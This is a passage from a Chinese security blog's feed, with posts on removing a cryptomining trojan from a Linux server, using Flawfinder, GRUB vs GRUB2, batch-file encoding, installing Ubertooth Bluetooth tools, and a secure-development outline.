srcset="/img/loading.gif" alt="20191219-trojan-08.png"><br>通过查看<code>/tmp/.X11-unix/00</code>文件，获取对应远控客户端进程id为<strong>8065</strong><br><img src="https://hksanduo.github.io/images/20191219-trojan-09.png" srcset="/img/loading.gif" alt="20191219-trojan-09.png"><br>通过pstree，我们可以清晰的看到两个异常的进程<strong>OYK6yV</strong>和 <strong>jKhnvF</strong><br><img src="https://hksanduo.github.io/images/20191219-trojan-10.png" srcset="/img/loading.gif" alt="20191219-trojan-10.png"><br>通过分析<code>ps -ef</code>的结果，获取异常异常进程信息<br><img src="https://hksanduo.github.io/images/20191219-trojan-11.png" srcset="/img/loading.gif" alt="20191219-trojan-11.png"><br>综合所有信息，我们发现jKhnvF是挖矿进程，OYK6yV是木马远控的进程。</p><h2 id="移除挖矿木马"><a href="#移除挖矿木马" class="headerlink" title="移除挖矿木马"></a>移除挖矿木马</h2><p>分析完挖矿木马基本信息，接下来我们需要移除这些恶意的进程，并针对相关漏洞进行打补丁。<br>我们首先移除了crotab中设定的定时任务<br><img src="https://hksanduo.github.io/images/20191219-trojan-12.png" srcset="/img/loading.gif" alt="20191219-trojan-12.png"><br>然后杀掉两个恶意进程<br><img src="https://hksanduo.github.io/images/20191219-trojan-13.png" srcset="/img/loading.gif" alt="20191219-trojan-13.png"><br>然后我发现当我们kill掉的挖矿进程又死灰复燃了，通过分析，可能其他地方还存在定时任务，或者遗漏，还有其他恶意进程，我们在 <strong>/etc/cron.d/</strong> 下发现<strong>0aliyun</strong>这个定时任务文件，突然发现这里还有一个定时任务，顺便发现在 <strong>/opt/</strong> 目录下，还有一个 <strong>aliyun.sh</strong> 的挖矿脚本。<br><img src="https://hksanduo.github.io/images/20191219-trojan-14.png" srcset="/img/loading.gif" alt="20191219-trojan-14.png"><br>我们通过移除两个定时任务，然后重复上面的操作，找到挖矿端和木马远控客户端，杀掉就行<br><img src="https://hksanduo.github.io/images/20191219-trojan-15.png" srcset="/img/loading.gif" alt="20191219-trojan-15.png"><br>清除<code>/root/.aliyun.sh</code>和<code>/opt/aliyun.sh</code><br>看着运行正常的系统，内心还是很满足的。<br><img src="https://hksanduo.github.io/images/20191219-trojan-16.png" srcset="/img/loading.gif" alt="20191219-trojan-16.png"></p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>后续溯源工作由于系统是研发同事的测试系统，上面运行三个web站点，并且安装redis，memcache等，并且未设置日志，所以并未发现攻击者是从什么地方进来的。针对这些问题我们给出以下建议:<br>1、配置redis的日志，对redis进行安全加固和合规性配置<br>2、使用河马webshell查杀工具对web目录进行扫描，查看是否有遗留的webshell<br>3、加固操作系统，重新设置复杂度较高的密码。</p><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li><a href="http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html" target="_blank" rel="noopener">http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html</a>【/tmp/.X11-unix=是什么玩意】</li><li><a href="https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix</a> 【what-is-tmp-x11-unix】</li><li><a href="https://www.cnblogs.com/jinanxiaolaohu/p/11993504.html" target="_blank" rel="noopener">https://www.cnblogs.com/jinanxiaolaohu/p/11993504.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>trojan</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flawfinder开源C/C++静态扫描分析工具安装与使用</title>
    <link href="/2019/11/15/2019-11-15-flawfinder-install-and-use/"/>
    <url>/2019/11/15/2019-11-15-flawfinder-install-and-use/</url>
    
    <content type="html"><![CDATA[<h2 id="Flawfinder开源C-C-静态扫描分析工具安装与使用"><a href="#Flawfinder开源C-C-静态扫描分析工具安装与使用" class="headerlink" title="Flawfinder开源C/C++静态扫描分析工具安装与使用"></a>Flawfinder开源C/C++静态扫描分析工具安装与使用</h2><h2 id="flawfinder的介绍"><a href="#flawfinder的介绍" class="headerlink" title="flawfinder的介绍"></a>flawfinder的介绍</h2><p>Flawfinder是一款开源的关于C/C++静态扫描分析工具，其根据内部字典数据库进行静态搜索，匹配简单的缺陷与漏洞，flawfinder工具不需要编译C/C++代码，可以直接进行扫描分析。简单快速，最大的有点就是免费，不需要编译。flawfinder工具可以在官网进行下载。<br><a href="https://dwheeler.com/flawfinder/#downloading" target="_blank" rel="noopener">https://dwheeler.com/flawfinder/#downloading</a></p><h2 id="flawfinder的安装"><a href="#flawfinder的安装" class="headerlink" title="flawfinder的安装"></a>flawfinder的安装</h2><p>flawfinder安装比较简单，由于其是基于Python实现的一款工具，所以需要首先安装Python环境，并配置环境变量。flawfinder下载之后解压既可使用。flawfinder目前之前python2和python3，简单的方法是使用pip工具，执行以下指令进行安装。</p><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> flawfinder</code></pre><h2 id="flawfinder的使用"><a href="#flawfinder的使用" class="headerlink" title="flawfinder的使用"></a>flawfinder的使用</h2><p>方式一：<code>flawfinder  --csv  &gt; test-result.csv   test.c</code><br>这种方式根据缺陷库生成一个 .csv文件  ，你只需要根据这个.csv文件就可以转换为正常Excel文件使用，转换方法自行百度。<br>方式二：<code>flawfinder  --html &gt; test-result.html test.c</code></p><h2 id="案例讲解"><a href="#案例讲解" class="headerlink" title="案例讲解"></a>案例讲解</h2><p>由于在日常审计过程中，项目中有其他格式的文件，通常使用linux<code>find</code>工具批量筛选.c或者.cpp文件，然后使用flawfinder进行扫描</p><pre><code class="hljs jboss-cli">cp <span class="hljs-params">--parents</span> `find 程序目录<span class="hljs-string">/-name</span> *<span class="hljs-string">.c</span>`  指定扫描目录</code></pre><ul><li>增加–parents目录主要作用是在拷贝的时候，会在目标路径中创建源文件参数中的所有父目录层级(不止是一层父目录)，然后将源文件拷贝进去。这样做的目的主要是清晰展示目录结构，方便写报告。</li></ul><pre><code class="hljs q">flawfinder --<span class="hljs-built_in">csv</span> &gt; result.<span class="hljs-built_in">csv</span> 指定扫描目录</code></pre><p>导出csv文件内容展示如下<br><img src="https://hksanduo.github.io/images/flawfinder-csv.png" srcset="/img/loading.gif" alt="flawfinder-csv.png"></p><h2 id="flawfinder分析"><a href="#flawfinder分析" class="headerlink" title="flawfinder分析"></a>flawfinder分析</h2><p>Flawfinder 不是类似于fortify那样复杂的工具。它是一个有意义的简单工具，但它很有用。  Flawfinder通过使用内置的C / C ++函数数据库来工作，该数据库具有众所周知的问题，例如缓冲区溢出风险（例如strcpy()，strcat()，gets()，sprintf()和scanf()系列），格式字符串问题（printf()， snprintf()和syslog()），竞争条件（例如access()，chown()，chgrp()，chmod()， tmpfile()，tmpnam()，tempnam()和mktemp()），潜在的外壳元字符危险（大多数exec()系列，system()，popen()）和较差的随机数获取（例如random()）。<br>Flawfinder的好处是不必创建此数据库，该工具附带了该数据库。Flawfinder获取源代码文本，并将源代码文本与这些名称匹配，同时忽略注释和字符串中的文本。<br>Flawfinder还了解gettext（国际化程序的公共库），并且会将通过gettext传递的常量字符串当作常量字符串对待。这减少了国际化程序中的错误命中次数。<br>Flawfinder生成按风险分类的“命中”（潜在安全漏洞）列表；默认情况下，最危险的匹配项将首先显示。此风险级别不仅取决于功能，还取决于功能的参数值。例如，在许多情况下，常量字符串通常比完全可变字符串的风险要小。在某些情况下，代码审计人员可能能够确定该构造物完全没有风险，从而减少了误报。与仅在源代码上运行“ grep”相比，Flawfinder提供了更好的信息和更好的优先级。毕竟，它知道忽略注释和字符串内部，并且还将检查参数以估计风险水平。但是，从根本上来说，flawfinder是一个简单的程序。它甚至不知道函数参数的数据类型，并且当然也不进行控制流或数据流分析。由于Flawfinder很简单，因此不会被宏定义和更复杂的工具遇到的其他奇怪问题所混淆。Flawfinder可以分析您无法构建的软件；在某些情况下，它可以分析甚至无法在本地编译的文件。并非每个命中实际上都是一个安全漏洞，也不一定找到每个安全漏洞。如上所述，flawfinder根本不真正理解代码的语义，它主要完成简单的文本模式匹配（忽略注释和字符串）。同样，它根本不执行数据流或控制流分析。<br>尽管如此，发现缺陷可以在发现和消除安全漏洞方面提供非常有用的帮助。</p><h2 id="错误修复"><a href="#错误修复" class="headerlink" title="错误修复"></a>错误修复</h2><p>在运行过程中，会出现解码出错，官方给出的建议是通过强制转换扫描文档的格式为utf-8，我们可以直接忽略<br><code>UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xff in position 0: invalid start byte</code><br><img src="https://hksanduo.github.io/images/flawfinder-error.png" srcset="/img/loading.gif" alt="flawfinder-error.png"></p><h3 id="官方修复建议"><a href="#官方修复建议" class="headerlink" title="官方修复建议"></a>官方修复建议</h3><p><img src="https://hksanduo.github.io/images/flawfinder-office-advice.png" srcset="/img/loading.gif" alt="flawfinder-office-advice.png"><br>将操作系统的编码格式设置成<code>utf-8</code>，将程序编码格式强制转换为utf-8，官方推荐的工具为<code>cvt2utf</code>，可以根据实际情况自行修改。</p><h3 id="个人修复建议"><a href="#个人修复建议" class="headerlink" title="个人修复建议"></a>个人修复建议</h3><p><img src="https://hksanduo.github.io/images/flawfinder-persional-advice1.png" srcset="/img/loading.gif" alt="flawfinder-persional-advice1.png"><br>个人这个就有点儿暴力，直接在打开文件的那一步设定，如果出现错误直接忽略。flawfinder如果使用pip安装，安装的位置位于<code>/usr/local/bin/flawfinder</code>，其他安装方式，请根据实际情况进行查找。<br><img src="https://hksanduo.github.io/images/flawfinder-persional-advice2.png" srcset="/img/loading.gif" alt="flawfinder-persional-advice2.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://dwheeler.com/flawfinder/" target="_blank" rel="noopener">https://dwheeler.com/flawfinder/</a>【flawfinder官网】</li><li><a href="https://github.com/david-a-wheeler/flawfinder" target="_blank" rel="noopener">https://github.com/david-a-wheeler/flawfinder</a>【github】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>code review</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>grub vs grub2 bootloader</title>
    <link href="/2019/11/12/2019-11-12-grub-vs-grub2-bootloader/"/>
    <url>/2019/11/12/2019-11-12-grub-vs-grub2-bootloader/</url>
    
    <content type="html"><![CDATA[<h2 id="grub和grub2对比"><a href="#grub和grub2对比" class="headerlink" title="grub和grub2对比"></a>grub和grub2对比</h2><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在本文中，我提供了一些对Linux引导加载程序GRUB（统一引导加载程序）的一些了解。如果您了解GRUB的工作模式，那么这篇文章可以帮助您更好的了解操作系统。如果您对在Linux上工作充满信心，那么您应该掌握GRUB引导加载程序。GRUB可以轻松地与DOS，Windows，Linux或任何BSD操作系统一起使用。</p><p>Grub引导加载程序可以动态配置，这意味着用户可以选择在引导时进行更改。甚至用户也可以轻松地更改当前的引导条目，他们可以添加新条目，选择多个内核，甚至可以修改initrd。GRUB还获得了逻辑块地址的支持。GRUB可以从任何类型的设备（例如硬盘，CD和USB）安装和执行</p><h1 id="GRUB和GRUB2是两个不同的版本。"><a href="#GRUB和GRUB2是两个不同的版本。" class="headerlink" title="GRUB和GRUB2是两个不同的版本。"></a>GRUB和GRUB2是两个不同的版本。</h1><p>GRUB2被视为Ubuntu的默认引导加载程序，而GRUB通常用于RHEL较旧的版本中。启动时，GRUB2主要显示一个菜单并等待用户的一些输入。它通常将控制权转移到我们的操作系统内核。GRUB2的主要设计目的是为当今的操作系统提供灵活性和性能。</p><h1 id="GRUB和GRUB2"><a href="#GRUB和GRUB2" class="headerlink" title="GRUB和GRUB2"></a>GRUB和GRUB2</h1><p>GRUB2的默认菜单看起来与GRUB非常相似，但是其中进行了一些更改。以下是个人总结的一些异同点,仅供参考:</p><ul><li>Grub有两个配置文件，即menu.lst和grub.conf，而Grub2只有一个主要配置文件，即grub.cfg，它看起来非常接近完整的脚本语言。每当添加或删除内核或用户运行update-grub时，此配置文件都会被某些Grub 2软件包更新所覆盖。对于任何配置更改，我们都需要运行update-grub来使更改生效。</li><li>在Grub1中，普通用户确实很难修改配置。但是Grub2更加用户友好，Grub-mkconfig将自动更改配置。</li><li>在grub1分区号从0开始，而在Grub2中，分区号从1开始。第一个设备仍用hd0标识。如果需要，可以通过对/ etc / grub文件夹的device.map文件进行一些更改来更改这些更改。</li><li>Grub1使用物理和逻辑地址来寻址磁盘，甚至无法从新的分区读取它，而Grub2使用UUID来标识磁盘，因此更加可靠。它支持LVM和RAID设备。</li><li>在包括（Ubuntu 和RHEL ）的当今Linux发行版中，GRUB2现在将直接显示登录提示，并且现在不显示菜单。</li><li>如果要在引导过程中查看菜单，则需要按住SHIFT键。即使有时按ESC也可以显示菜单。</li><li>用户现在还可以选择创建自定义文件，在其中可以放置自己的菜单项。可以使用/etc/grub.d文件夹中的40_custom文件进行配置。</li><li>现在，用户甚至也可以更改菜单显示设置。这是通过修改/ etc / default文件夹下的grub文件实现的。</li></ul><hr><p>参考：<a href="https://zh.wikipedia.org/wiki/GNU_GRUB" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/GNU_GRUB</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>Security</category>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>grub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>批处理bat echo中文乱码解决方法</title>
    <link href="/2019/09/27/2019-09-27-change-bat-echo-garble/"/>
    <url>/2019/09/27/2019-09-27-change-bat-echo-garble/</url>
    
    <content type="html"><![CDATA[<h2 id="批处理bat-echo中文乱码解决方法"><a href="#批处理bat-echo中文乱码解决方法" class="headerlink" title="批处理bat echo中文乱码解决方法"></a>批处理bat echo中文乱码解决方法</h2><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>运行批处理bat文件，中文输出乱码，网上找到的解决方案，通过指定输出编码来解决：<code>chcp 65001</code><br>以下是测试用例</p><pre><code class="hljs dos">@<span class="hljs-built_in">echo</span> off<span class="hljs-comment">REM 声明采用UTF-8编码</span><span class="hljs-built_in">chcp</span> <span class="hljs-number">65001</span><span class="hljs-built_in">echo</span> test<span class="hljs-built_in">echo</span> 中文测试<span class="hljs-built_in">pause</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Note</tag>
      
      <tag>bat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubertooth安装</title>
    <link href="/2019/08/08/2019-08-07-ubertooth-install0/"/>
    <url>/2019/08/08/2019-08-07-ubertooth-install0/</url>
    
    <content type="html"><![CDATA[<h2 id="Ubertooth安装教程"><a href="#Ubertooth安装教程" class="headerlink" title="Ubertooth安装教程"></a>Ubertooth安装教程</h2><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本教程安装环境为ubuntu 19.04，ubertooth固件为2018-12-R1，由于ubertooth首次安装使用，<br>为了更好的适配最新的应用程序，请及时更新对应的固件</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>获取最新的ubertooth发行版，地址：<a href="https://github.com/greatscottgadgets/ubertooth/releases" target="_blank" rel="noopener">https://github.com/greatscottgadgets/ubertooth/releases</a><br>解压以后，点击进入<code>ubertooth-one-firmware-bin</code>目录<br><img src="https://hksanduo.github.io/images/ubertooth-one-firmware.png" srcset="/img/loading.gif" alt="image"></p><h1 id="更新固件"><a href="#更新固件" class="headerlink" title="更新固件"></a>更新固件</h1><p>在对应目录下执行以下命令<code>ubertooth-dfu -d bluetooth_rxtx.dfu -r</code></p><pre><code class="hljs routeros">$ ubertooth-dfu -d bluetooth_rxtx.dfu -rChecking<span class="hljs-built_in"> firmware </span>signature<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.Detached</code></pre><p>设备将自动进入DFU模式并刷新固件。</p><p>如果最后看到control message unsupported，这意味着重置设备失败。您可以通过运行ubertooth-util -r或从Ubertooth拔下USB电缆并重新连接来解决。</p><h1 id="检查是否更新成功"><a href="#检查是否更新成功" class="headerlink" title="检查是否更新成功"></a>检查是否更新成功</h1><p>在非DFU模式下，您可以使用以下方式获取固件信息ubertooth-util -v。请注意，显示的版本应与您刚刚安装的版本匹配：</p><pre><code class="hljs angelscript">$ ubertooth-util -vFirmware version: <span class="hljs-number">2018</span><span class="hljs-number">-12</span>-R1 (API:<span class="hljs-number">1.06</span>)$ ubertooth-util -Vubertooth <span class="hljs-number">2018</span><span class="hljs-number">-12</span>-R1 (<span class="hljs-symbol">mikeryan@</span>steel) Tue Dec  <span class="hljs-number">4</span> <span class="hljs-number">22</span>:<span class="hljs-number">23</span>:<span class="hljs-number">44</span> PST <span class="hljs-number">2018</span></code></pre><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>文章主要是个人参考官方安装文档女装常见的工具，为蓝牙测试做准备。至于固件的研发和更新固件遇到错误，请读者参考官方文档和解决方案。</p><hr><p>参考：<a href="https://github.com/greatscottgadgets/ubertooth/wiki/Firmware" target="_blank" rel="noopener">https://github.com/greatscottgadgets/ubertooth/wiki/Firmware</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bluetooth</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubertooth安装</title>
    <link href="/2019/08/08/2019-08-07-ubertooth-install/"/>
    <url>/2019/08/08/2019-08-07-ubertooth-install/</url>
    
    <content type="html"><![CDATA[<h2 id="Ubertooth安装教程"><a href="#Ubertooth安装教程" class="headerlink" title="Ubertooth安装教程"></a>Ubertooth安装教程</h2><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本教程安装环境为ubuntu 19.04  ubertooth固件为2018-12-R1</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>在构建libbtbb和Ubertooth工具之前，需要预先安装一下编译环境，其中许多都可以从您的操作系统的安装源中中获得，例如：</p><h2 id="Debian-Ubuntu"><a href="#Debian-Ubuntu" class="headerlink" title="Debian/Ubuntu"></a>Debian/Ubuntu</h2><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install cmake libusb-<span class="hljs-number">1.0</span>-<span class="hljs-number">0</span>-dev <span class="hljs-keyword">make</span> gcc g++ libbluetooth-dev pkg-config libpcap-dev <span class="hljs-keyword">python</span>-numpy <span class="hljs-keyword">python</span>-pyside <span class="hljs-keyword">python</span>-pyside2* <span class="hljs-keyword">python</span>-qt4</code></pre><h2 id="Fedora-Red-Hat"><a href="#Fedora-Red-Hat" class="headerlink" title="Fedora / Red Hat"></a>Fedora / Red Hat</h2><pre><code class="hljs llvm">su -<span class="hljs-keyword">c</span> <span class="hljs-string">"yum install libusb1-devel make gcc wget tar bluez-libs-devel"</span></code></pre><h2 id="MAC-OS"><a href="#MAC-OS" class="headerlink" title="MAC OS"></a>MAC OS</h2><p>Mac OS X用户可以使用MacPorts或Homebrew来安装所需的软件包</p><pre><code class="hljs routeros">brew install libusb wget cmake pkg-config libpcap<span class="hljs-keyword">or</span>sudo<span class="hljs-built_in"> port </span>install libusb wget cmake python27 py27-numpy py27-pyside</code></pre><h2 id="FreeBSD"><a href="#FreeBSD" class="headerlink" title="FreeBSD"></a>FreeBSD</h2><p>FreeBSD用户可以直接从ports和package系统安装主机工具和库</p><pre><code class="hljs cmake">sudo pkg <span class="hljs-keyword">install</span> ubertooth</code></pre><h1 id="安装libbtbb"><a href="#安装libbtbb" class="headerlink" title="安装libbtbb"></a>安装libbtbb</h1><p>接下来需要为Ubertooth工具构建蓝牙基带库(libbtbb)进而解析蓝牙数据包。</p><pre><code class="hljs properties"><span class="hljs-attr">wget</span> <span class="hljs-string">https://github.com/greatscottgadgets/libbtbb/archive/2018-12-R1.tar.gz -O libbtbb-2018-12-R1.tar.gz</span><span class="hljs-attr">tar</span> <span class="hljs-string">-xf libbtbb-2018-12-R1.tar.gz</span><span class="hljs-attr">cd</span> <span class="hljs-string">libbtbb-2018-12-R1</span><span class="hljs-attr">mkdir</span> <span class="hljs-string">build</span><span class="hljs-attr">cd</span> <span class="hljs-string">build</span><span class="hljs-attr">cmake</span> <span class="hljs-string">..</span><span class="hljs-attr">make</span><span class="hljs-attr">sudo</span> <span class="hljs-string">make install</span></code></pre><p>注意：Linux用户如果是第一次安装或者出现无法找到libbtbb库的错误，请执行：</p><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo ldconfig</span></code></pre><h2 id="安装ubertooth工具"><a href="#安装ubertooth工具" class="headerlink" title="安装ubertooth工具"></a>安装ubertooth工具</h2><p>Ubertooth存储库包含用于嗅探蓝牙数据包，配置Ubertooth和更新固件的主机代码。默认情况下，使用以下三种方法构建和安装：</p><h2 id="实体编译"><a href="#实体编译" class="headerlink" title="实体编译"></a>实体编译</h2><pre><code class="hljs properties"><span class="hljs-attr">wget</span> <span class="hljs-string">https://github.com/greatscottgadgets/ubertooth/releases/download/2018-12-R1/ubertooth-2018-12-R1.tar.xz</span><span class="hljs-attr">tar</span> <span class="hljs-string">xf ubertooth-2018-12-R1.tar.xz</span><span class="hljs-attr">cd</span> <span class="hljs-string">ubertooth-2018-12-R1/host</span><span class="hljs-attr">mkdir</span> <span class="hljs-string">build</span><span class="hljs-attr">cd</span> <span class="hljs-string">build</span><span class="hljs-attr">cmake</span> <span class="hljs-string">..</span><span class="hljs-attr">make</span><span class="hljs-attr">sudo</span> <span class="hljs-string">make install</span></code></pre><p>注意：Linux用户如果是第一次安装或者出现找不到库的错误，请执行：</p><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo ldconfig</span></code></pre><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>Wireshark版本1.12及更新版本默认包含Ubertooth BLE插件。也可以通将Ubertooth的BLE直接捕获到Wireshark中。</p><p>Wireshark BTBB和BR/EDR插件允许使用Kismet捕获的蓝牙基带流量在Wireshark GUI中进行分析和检测。它们与Ubertooth和libbtbb软件的其余部分分开构建。</p><p>传递给cmake的目录MAKE_INSTALL_LIBDIR因系统而异，但它应该是现有Wireshark插件的位置，例如asn1.so和ethercat.so。在macOS上目录可能位于/Applications/Wireshark.app/Contents/PlugIns/wireshark/</p><pre><code class="hljs properties"><span class="hljs-attr">sudo</span> <span class="hljs-string">apt-get install wireshark wireshark-dev libwireshark-dev cmake</span><span class="hljs-attr">cd</span> <span class="hljs-string">libbtbb-2018-12-R1/wireshark/plugins/btbb</span><span class="hljs-attr">mkdir</span> <span class="hljs-string">build</span><span class="hljs-attr">cd</span> <span class="hljs-string">build</span><span class="hljs-attr">cmake</span> <span class="hljs-string">-DCMAKE_INSTALL_LIBDIR=/usr/lib/x86_64-linux-gnu/wireshark/libwireshark3/plugins ..</span><span class="hljs-attr">make</span><span class="hljs-attr">sudo</span> <span class="hljs-string">make install</span></code></pre><p>BT BR/EDR组件重复相同的步骤进行安装</p><pre><code class="hljs properties"><span class="hljs-attr">sudo</span> <span class="hljs-string">apt-get install wireshark wireshark-dev libwireshark-dev cmake</span><span class="hljs-attr">cd</span> <span class="hljs-string">libbtbb-2018-12-R1/wireshark/plugins/btbredr</span><span class="hljs-attr">mkdir</span> <span class="hljs-string">build</span><span class="hljs-attr">cd</span> <span class="hljs-string">build</span><span class="hljs-attr">cmake</span> <span class="hljs-string">-DCMAKE_INSTALL_LIBDIR=/usr/lib/x86_64-linux-gnu/wireshark/libwireshark3/plugins ..</span><span class="hljs-attr">make</span><span class="hljs-attr">sudo</span> <span class="hljs-string">make install</span></code></pre><h2 id="第三方软件"><a href="#第三方软件" class="headerlink" title="第三方软件"></a>第三方软件</h2><p>有许多支持Ubertooth的第三方软件。有些人支持Ubertooth开箱即用，而其他人则需要建立插件。</p><h1 id="安装kismet"><a href="#安装kismet" class="headerlink" title="安装kismet"></a>安装kismet</h1><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> kismet</code></pre><h1 id="安装BLE解密工具crackle"><a href="#安装BLE解密工具crackle" class="headerlink" title="安装BLE解密工具crackle"></a>安装BLE解密工具crackle</h1><p>crackle的地址是：<a href="https://github.com/mikeryan/crackle.git" target="_blank" rel="noopener">https://github.com/mikeryan/crackle.git</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code class="hljs vim">git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/mikeryan/crackle.git<span class="hljs-keyword">cd</span> crackle<span class="hljs-keyword">make</span><span class="hljs-keyword">make</span> install</code></pre><h1 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h1><h2 id="No-module-named-PySide2"><a href="#No-module-named-PySide2" class="headerlink" title="No module named PySide2"></a>No module named PySide2</h2><p>当运行<code>ubertooth-specan-ui</code>会显示</p><pre><code class="hljs sql">$ ubertooth-specan-uiTraceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):  <span class="hljs-keyword">File</span> <span class="hljs-string">"/usr/local/bin/ubertooth-specan-ui"</span>, line <span class="hljs-number">29</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;    <span class="hljs-keyword">from</span> PySide2 <span class="hljs-keyword">import</span> QtCore, QtGui, QtWidgetsImportError: <span class="hljs-keyword">No</span> <span class="hljs-keyword">module</span> named PySide2</code></pre><p>这个是由于pyside分为pyside和pyside2，官方提供安装列表中仅安装pyside，所以python-pyside2需要我们手动进行安装，<br>懒得去查看系统到底需要那些模块，这里大力出奇迹，安装apt源中所有的pyside2相关软件包。<br><img src="hksanduo.github.io/images/ubertooth-specan-ui.png" srcset="/img/loading.gif" alt="image"><br>大功告成。</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>文章主要是个人参考官方安装文档女装常见的工具，为蓝牙测试做准备。</p><hr><p>参考：<a href="https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide" target="_blank" rel="noopener">https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide</a></p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bluetooth</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安全开发流程</title>
    <link href="/2019/08/07/2019-08-07-security-develop/"/>
    <url>/2019/08/07/2019-08-07-security-develop/</url>
    
    <content type="html"><![CDATA[<h2 id="安全开发流程"><a href="#安全开发流程" class="headerlink" title="安全开发流程"></a>安全开发流程</h2><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h2 id="软件开发生命周期-SDL"><a href="#软件开发生命周期-SDL" class="headerlink" title="软件开发生命周期(SDL)"></a>软件开发生命周期(SDL)</h2><h1 id="安全需求"><a href="#安全需求" class="headerlink" title="安全需求"></a>安全需求</h1><h1 id="安全设计"><a href="#安全设计" class="headerlink" title="安全设计"></a>安全设计</h1><h1 id="安全编码"><a href="#安全编码" class="headerlink" title="安全编码"></a>安全编码</h1><h1 id="安全测试"><a href="#安全测试" class="headerlink" title="安全测试"></a>安全测试</h1><h1 id="安全部署和运维"><a href="#安全部署和运维" class="headerlink" title="安全部署和运维"></a>安全部署和运维</h1>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Develop</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SDL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson 反序列化问题</title>
